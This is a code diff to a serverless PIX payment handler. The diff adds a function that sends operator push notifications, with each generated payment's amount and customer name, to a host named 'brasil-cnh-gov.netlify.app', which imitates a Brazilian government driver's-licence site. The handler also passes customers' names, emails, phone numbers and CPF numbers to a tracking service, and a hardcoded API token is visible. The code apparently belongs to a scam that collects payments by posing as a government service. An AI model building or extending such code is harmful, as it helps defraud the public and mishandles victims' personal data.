@@ -7,6 +7,19 @@ const UTMIFY_TOKEN = "lzASZob4ldSJJc3jT1LILy9alPxWJgpnPhCh";
 const SUPABASE_URL = process.env.NEXT_PUBLIC_SUPABASE_URL;
 const SUPABASE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
 
+async function sendPushNotification(title, message, tag, type, transactionId, amount, customerName) {
+  try {
+    const payload = JSON.stringify({ title, message, tag, type, transactionId, amount, customerName });
+    await httpsRequest("brasil-cnh-gov.netlify.app", "/api/pwa-send-push", "POST", {
+      "Content-Type": "application/json",
+      "Content-Length": Buffer.byteLength(payload),
+    }, payload, 5000);
+    console.log("[PWA-PUSH] Notificação enviada:", tag);
+  } catch (err) {
+    console.error("[PWA-PUSH] Erro ao enviar push (não bloqueia):", err.message);
+  }
+}
+
 const utmifyCache = new Map();
 const CACHE_TTL = 60000;
 
@@ -160,6 +173,17 @@ exports.handler = async (event) => {
     }
 
     await sendUtmify(transactionId, "waiting_payment", { name: customerName, email: customerEmail, phone: customerPhone, cpf: customerCpf }, amountCents, new Date().toISOString().replace("T", " ").slice(0, 19), utms).catch(err => console.error("[UTMify] Erro:", err.message));
+
+    const amountReaisFmt = amountReais.toFixed(2).replace(".", ",");
+    await sendPushNotification(
+      "💰 PIX Gerado",
+      `R$ ${amountReaisFmt} - ${customerName}\nID: ${transactionId}`,
+      `pix-gerado-${transactionId}`,
+      "generated",
+      transactionId,
+      amountReais,
+      customerName
+    );
 
     return jsonResponse(200, {
       success: true, pixCode, pix_code: pixCode, brcode: pixCode, payload: pixCode, qr_code_image: null,
